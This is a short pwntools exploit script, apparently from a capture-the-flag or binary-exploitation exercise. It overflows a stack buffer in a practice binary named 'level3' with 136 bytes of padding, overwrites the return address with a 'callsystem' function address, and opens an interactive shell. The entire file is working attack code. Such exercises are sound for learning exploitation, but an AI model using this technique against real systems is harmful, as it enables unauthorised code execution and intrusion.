#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
p = process('./level3')
# p = remote('127.0.0.1', 10001)
callsystem = 0x400588 # 0x400584
offset = 136
# gdb.attach(p)
payload = flat(['A' * offset, callsystem])
print repr(payload)
p.recvuntil('Hello, World')
p.send(payload)
p.interactive()
